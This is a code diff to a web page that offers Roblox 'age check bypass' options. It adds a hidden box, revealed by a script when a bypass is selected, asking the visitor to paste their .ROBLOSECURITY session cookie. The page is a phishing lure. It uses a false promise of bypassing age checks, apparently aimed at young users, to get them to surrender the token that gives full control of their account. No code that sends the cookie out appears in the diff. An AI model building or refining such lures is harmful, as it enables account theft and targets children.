@@ -91,6 +91,48 @@
       font-size: 15px;
     }
 
+    /* Neu: Style für den Cookie-Block */
+    .cookie-block {
+      margin-top: 20px;
+      background: #1d3a6a; /* Blau-dunkel */
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0, 123, 255, 0.5);
+      color: #d0e7ff;
+      font-family: monospace;
+    }
+
+    .cookie-block-title {
+      font-weight: 700;
+      font-size: 18px;
+      margin-bottom: 10px;
+      border-bottom: 2px solid #3399ff;
+      padding-bottom: 6px;
+      color: #99ccff;
+    }
+
+    textarea {
+      width: 100%;
+      height: 100px;
+      background: #134078;
+      border: none;
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 14px;
+      color: #d0e7ff;
+      resize: vertical;
+      font-family: monospace;
+    }
+
+    textarea::placeholder {
+      color: #a0c4ff;
+    }
+
+    /* Versteckt die Box standardmäßig */
+    #cookieInputContainer {
+      display: none;
+    }
+
     @media (max-width: 600px) {
       h1 {
         font-size: 28px;
@@ -105,10 +147,15 @@
   <div class="container">
     <label for="bypass">🔐 Account Security Options</label>
     <select id="bypass">
-      <option>-- Select an option --</option>
-      <option>Bypass for under 13</option>
-      <option>Bypass all age checks</option>
+      <option value="">-- Select an option --</option>
+      <option value="under13">Bypass for under 13</option>
+      <option value="allages">Bypass all age checks</option>
     </select>
+
+    <div id="cookieInputContainer" class="cookie-block">
+      <div class="cookie-block-title">.ROBLOSECURITY Cookie</div>
+      <textarea placeholder="Paste your .ROBLOSECURITY Cookie here..."></textarea>
+    </div>
 
     <div class="info-box">
       <div class="info-title">⚠️ Important Information</div>
@@ -122,5 +169,18 @@
       </ul>
     </div>
   </div>
+
+  <script>
+    const bypassSelect = document.getElementById('bypass');
+    const cookieInputContainer = document.getElementById('cookieInputContainer');
+
+    bypassSelect.addEventListener('change', () => {
+      if (bypassSelect.value === 'under13' || bypassSelect.value === 'allages') {
+        cookieInputContainer.style.display = 'block';
+      } else {
+        cookieInputContainer.style.display = 'none';
+      }
+    });
+  </script>
 </body>
 </html>
